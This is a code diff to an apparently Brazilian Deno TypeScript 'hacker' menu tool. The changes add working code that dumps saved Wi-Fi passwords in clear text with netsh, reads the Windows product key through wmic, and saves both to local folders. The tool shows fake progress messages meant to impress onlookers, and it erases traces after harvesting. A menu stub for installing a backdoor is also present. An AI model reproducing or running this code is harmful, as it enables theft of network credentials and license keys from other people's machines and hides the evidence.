@@ -42,7 +42,8 @@ async function menu() {
 			// Instalar backdoor kjkkjkkkjkjkjkkjk
 			break;
 		case 3:
-			// Clonar key do Windows
+			// Copiar key do Windows
+			await copyWinKey();
 			break;
 		case 4:
 			// Limpar registros de arquivos
@@ -70,38 +71,32 @@ async function NetSHProfileCollector() {
 			'FireWall desbloqueado na porta 8080.',
 		],
 		['Testando servidor Proxy...', 'Conexão estabilizanda.'],
-		['Clonando redes Wi-Fi...', 'Transferindo informações...'],
 	];
 
 	for (const status of statuses) { // Exibe status fakes pra impressionar leigos
 		await createFakeStatus(status[0], status[1]);
 	}
 
+	const spinner = new Spinner('Clonando redes Wi-Fi...');
+
 	Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários
 		.catch(() => {});
 
-	// Chamando a API do Windows
-	const process = Deno.run({
-		cmd: [
-			'netsh',
-			'wlan',
-			'export',
-			'profile',
-			'key=clear',
-			'folder=.tempdata',
-		],
-		stderr: 'piped',
-		stdout: 'piped',
-	});
+	Deno.mkdir('WiFiPasswords') // Cria pasta de senhas
+		.catch(() => {});
 
-	// Decodifica o retorno do processo
-	console.log(new TextDecoder().decode(await process.output()));
-	process.close(); // Encerra processo
+	// Chamando a API do Windows
+	await executeCommand(
+		'netsh wlan export profile key=clear folder=.tempdata',
+	);
+
+	let counter = 0;
 
 	// Por padrão, A API fornece as informações em arquivos XML bem poluídos
 	// Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
 	for (const file of Deno.readDirSync('.tempdata')) {
-		if (file.isDirectory) continue; // Pular diretórios
+		if (file.isDirectory) continue; // Pular pastas
+		counter++;
 
 		// Lendo conteúdo do arquivo
 		const content = Deno.readTextFileSync(`.tempdata/${file.name}`);
@@ -122,9 +117,36 @@ async function NetSHProfileCollector() {
 		);
 	}
 
+	spinner.end(`${counter} redes clonadas.`);
+
+	await delay(1_000);
 	await clearTraces(); // Limpar registros
 
 	return;
+}
+
+async function copyWinKey() {
+	currentMenu = 'KEY CLONER';
+
+	const status = new Spinner('Obtendo chave de ativação...');
+	await delay(3_000);
+
+	const key = (await executeCommand(
+		'wmic path softwarelicensingservice get OA3xOriginalProductKey',
+	)).split('\n')[1];
+
+	status.end(
+		`Chave de ativação obtida:\n\n${gs('yellow', 'red')(key)}`,
+	);
+
+	Deno.mkdir('WindowsKeys') //
+		.catch(() => {});
+
+	Deno.writeTextFileSync(
+		`WindowsKeys/${Deno.hostname()}.txt`,
+		`Machine: ${Deno.hostname()}\nWindows License Key: ${key}`,
+	);
+	await delay(3_000);
 }
 
 async function clearTraces() {
@@ -144,25 +166,33 @@ async function checkDisk() {
 	currentMenu = 'CHECK DISK';
 
 	const status = new Spinner('Verificando integridade...');
+	const res = await executeCommand('chkdsk /r /f d:');
 
+	status.end('Verificação concluída.');
+	console.log(res);
+	return;
+}
+
+async function executeCommand(cmd: string) {
 	const process = Deno.run({
-		cmd: ['chkdsk', '/r', '/f', 'd:'],
+		cmd: cmd.split(' '),
 		stdout: 'piped',
 		stderr: 'piped',
 	});
 
-	// Decodifica o retorno do processo
-	console.log(new TextDecoder().decode(await process.output()));
+	const res = new TextDecoder()
+		.decode(await process.output());
+
 	process.close(); // Encerra processo
 
-	status.end('Verificação concluída.');
-	return;
+	return res;
 }
 
 async function createFakeStatus(loadingMsg: string, completeMsg: string) {
 	const status = new Spinner(loadingMsg, currentMenu);
 	await delay(random());
 	status.end(completeMsg);
+
 	return;
 }
 
@@ -192,6 +222,7 @@ class Spinner {
 			color: 'red',
 		}).start();
 	}
+
 	end(msg?: string) {
 		this.text = msg || this.text;
 		this.spinner.succeed(this._format());
